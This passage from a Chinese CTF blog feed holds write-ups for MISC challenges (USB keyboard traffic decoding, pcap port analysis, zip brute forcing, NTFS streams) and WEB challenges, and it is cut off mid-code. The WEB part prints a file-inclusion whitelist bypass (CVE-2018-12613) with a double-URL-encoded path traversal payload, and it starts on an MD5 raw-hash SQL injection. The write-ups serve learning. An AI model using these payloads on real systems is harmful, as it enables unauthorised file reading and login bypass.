class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;xxx.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="comment">#print(&quot;&quot;.join(output))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>上方是键盘流量的解题脚本，下方说一下ctf中解题步奏</p><p>1、打开流量包，分析出键盘和鼠标流量类型</p><p>2、使用tshark数据进行提起tshark -r xxx.pcapng -T fields -e usb.capdata &gt;xxx.txt</p><p>3、提取后运行上方脚本即可得到键盘输入的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用工具：&lt;br&gt;Wireshark&lt;br&gt;Python&lt;/p&gt;
&lt;h1 id=&quot;USB键盘流量&quot;&gt;&lt;a href=&quot;#USB键盘流量&quot; class=&quot;headerlink&quot; title=&quot;USB键盘流量&quot;&gt;&lt;/a&gt;USB键盘流量&lt;/h1&gt;&lt;p&gt;这里讲一讲键盘流量的一个分析</summary>
      
    
    
    
    <category term="MISC" scheme="http://blog.falsectf.top/categories/MISC/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="流量分析" scheme="http://blog.falsectf.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>MISC-刷题记录</title>
    <link href="http://blog.falsectf.top/2020/03/01/eb9d.html"/>
    <id>http://blog.falsectf.top/2020/03/01/eb9d.html</id>
    <published>2020-03-01T03:14:00.000Z</published>
    <updated>2020-12-31T11:50:20.761Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、nmapll-pcapng流量分析"><a href="#1、nmapll-pcapng流量分析" class="headerlink" title="1、nmapll.pcapng流量分析"></a>1、nmapll.pcapng流量分析</h4><p>附件下载<br>链接：<a href="https://pan.baidu.com/s/1vPnPVPKkQltwbnUp5MzNig">https://pan.baidu.com/s/1vPnPVPKkQltwbnUp5MzNig</a>  提取码：hgar</p><p>题目描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在参加网络安全大赛第二届世界巡回赛新加坡站一场与SP战队的比赛时，</span><br><span class="line">作为K&amp;K战队主防手的你使用经典的“三条命令”检查端口封闭状况。</span><br><span class="line">可是这次比赛平台没有回显，你能查出来有哪些端口是开放的嘛？</span><br><span class="line">请将开放端口按由小到大顺序写入flag中 如：开放1、22、234端口，flag&#123;122234&#125;</span><br></pre></td></tr></table></figure><p>根据题目的描述，这是出自《亲爱的，热爱的》电视剧中的一段故事，其中有效信息如下图<br><img src="/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nmapl.jpg"><br>根据上图我们可以看到这是对自己进行了扫描，使用了 -sT -A参数<br><img src="/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nmap2.jpg"><br>参考链接：<a href="https://www.cocosec.com/archives/114.html">https://www.cocosec.com/archives/114.html</a><br>由上图可以得知在进行TCP完全链接扫描时，会进行三次握手，而握手成功的标识就是返回SYN与ACK包<br>由此我们可以在wireshark中构造过滤条件，选出符合条件的数据包<br>过滤语句：<code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code></p><p><img src="/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nmapll.png"><br>经过观察可以得到flag{21226318013306}</p><h4 id="2、De1CTF-Misc杂烩-Misc-Chowder"><a href="#2、De1CTF-Misc杂烩-Misc-Chowder" class="headerlink" title="2、De1CTF-Misc杂烩/Misc Chowder"></a>2、De1CTF-Misc杂烩/Misc Chowder</h4><p>以下链接失效可以qq联系我重新挂上，如有题目附件侵权联系我删除<br>原始附件链接：<a href="https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing">https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing</a><br>网盘附件链接：链接：<a href="https://pan.baidu.com/s/1tyxvn-CSq6QJqZGyJWnqVA">https://pan.baidu.com/s/1tyxvn-CSq6QJqZGyJWnqVA</a> 提取码：tt73 <code>侵删</code></p><p><code>hint1：流量包中的网络连接对解题没有帮助</code><br><code>hint2：不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取</code><br><code>hint3：压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</code></p><p>首先，下载题目附件后发现是一个pcap文件，wireshark打开分析<br>有很多的无用流量，过滤http协议,upload字符，后发现一个upload操作，这里主要是png图片有用<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-1.png"><br>选中这条流量，将png图片导出<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-2.png"><br>之后打开这个png图片，发现是一个链接<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-3.png"><br>原链接应该失效了，这里我放到网盘了：链接：<a href="https://pan.baidu.com/s/1vFSL61DHItX9gmBR8xUH8g">https://pan.baidu.com/s/1vFSL61DHItX9gmBR8xUH8g</a> 提取码：rk0o <code>侵删</code><br>下载下来后是一个readme.docx文件<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-4.png"><br>这里我打开docx会报错，所以我直接改后缀为zip了，然后解压，发现了另一个zip文件<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-5.png"><br>但是这个zip有密码，根据题目的提示，需要爆破，这里掩码爆破<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-6.png"><br>最后爆破了20多分钟得到密码：DE34Q1<br>将You_found_me_Orz.zip解压后是一个jpg的图片，binwalk分离出一个Rar文件<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-7.png"><br>Rar解压后发现3个文件，flag.txt是假flag，666.png也没有有效信息无lsb隐写<br>最后想到了NTFS隐写，dir /r发现果然是NTFS，notepad读一下，获得flag<br><img src="https://cdn.jsdelivr.net/gh/False-sec/blog-img@master/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc2-8.png"><br>emmmm  大杂烩  大套娃！！！</p><h4 id="2、De1CTF-MISC-life"><a href="#2、De1CTF-MISC-life" class="headerlink" title="2、De1CTF-MISC-life"></a>2、De1CTF-MISC-life</h4><p>题目描述：<code>No Game No Life!</code><br>附件链接：</p><p>题目下载到本地后是一张图片，binwalk分离，分离出一个压缩包<br>压缩包中存在一个flag.zip和passphare.png，其中passphare.png是个不规则二维码<br>这里需要根据题目的提示，搜到一个这么网站<a href="https://playgameoflife.com/">https://playgameoflife.com/</a></p><p>然后将passphare.png中的二维码色块手动添加上去，点击下方的NEXT按钮，就可以看见正常二维码了<br><img src="/images/MISC-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/misc3-1.png"><br>拼好后扫描二维码结果：<code>AJTC8ADEVRA13AR</code> 即为flag.zip的密码<br>解密后发现一串base64编码过的字串，尝试解密失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&#x27;0QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>得到一串16进制数，base16解密也失败，逆序一下即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&#x27;d71233d64376f5338647f54727167337f53757f54733c6b7644534135644&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>之后base16解密得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、nmapll-pcapng流量分析&quot;&gt;&lt;a href=&quot;#1、nmapll-pcapng流量分析&quot; class=&quot;headerlink&quot; title=&quot;1、nmapll.pcapng流量分析&quot;&gt;&lt;/a&gt;1、nmapll.pcapng流量分析&lt;/h4&gt;&lt;p&gt;附件</summary>
      
    
    
    
    <category term="MISC" scheme="http://blog.falsectf.top/categories/MISC/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="MISC" scheme="http://blog.falsectf.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>WEB-刷题记录</title>
    <link href="http://blog.falsectf.top/2020/02/28/cb27.html"/>
    <id>http://blog.falsectf.top/2020/02/28/cb27.html</id>
    <published>2020-02-28T12:19:44.000Z</published>
    <updated>2020-12-31T11:50:26.214Z</updated>
    
    <content type="html"><![CDATA[<h4 id="WEB1-HCTF2018-WEB"><a href="#WEB1-HCTF2018-WEB" class="headerlink" title="WEB1-HCTF2018-WEB"></a>WEB1-HCTF2018-WEB</h4><p>version：4.8.1 文件包含漏洞 <a href="https://xz.aliyun.com/t/5534#toc-3">https://xz.aliyun.com/t/5534#toc-3</a><br>该漏洞cve编号为CVE-2018-12613 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12613">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12613</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一道php代码审计的题目，其中hint.php 内容为： ffffllllaaaagggg</p><p>进行代码审计，发现下方传入的file参数必须是字符串类型，然后传入checkFile()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">checkFile()方法分析</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>))  <span class="comment">//file值不能为空，且必须是字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>))  <span class="comment">//必须再白名单中即 source.php 和 hint.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_page</span> = mb_substr(     <span class="comment">//截取传入参入 ? 之前的字符</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">//对传入的参数进行一次url解码</span></span><br></pre></td></tr></table></figure><p>可见，file参数需要满足以下几点<br>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br>由此，我们可以构造payload：?source.php%253f../../../../../ffffllllaaaagggg</p><h4 id="BUU复现-BJDCTF2020-Easy-MD5"><a href="#BUU复现-BJDCTF2020-Easy-MD5" class="headerlink" title="BUU复现-[BJDCTF2020]Easy MD5"></a>BUU复现-[BJDCTF2020]Easy MD5</h4><p><strong>考点：MD5弱类型、MD5强类型</strong></p><p>打开靶机链接，页面是一个输入框，从url可以判断出输入的是密码，但是没有什么回显</p><p>打开bp抓个包repeater一下，发现在返回头中有如下Hint信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Thu, 23 Jul 2020 01:09:17 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br><span class="line">X-Powered-By: PHP/7.3.13</span><br><span class="line">Content-Length: 3165</span><br></pre></td></tr></table></figure><p>其中password=**md5($pass,true)**这里是存在安全问题的</p><h2 id="MD5函数语法"><a href="#MD5函数语法" class="headerlink" title="MD5函数语法"></a>MD5函数语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5(<span class="variable">$a</span>,<span class="literal">True</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出</span></span><br><span 